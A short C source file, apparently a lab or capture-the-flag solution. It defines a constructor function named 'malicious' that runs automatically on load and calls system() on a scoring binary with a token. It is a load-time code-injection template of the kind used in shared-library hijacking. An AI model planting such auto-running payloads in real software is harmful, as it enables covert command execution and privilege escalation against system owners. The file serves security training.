#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 9e231b4f-781b-4fa0-bd33-9d397a368f16");
}
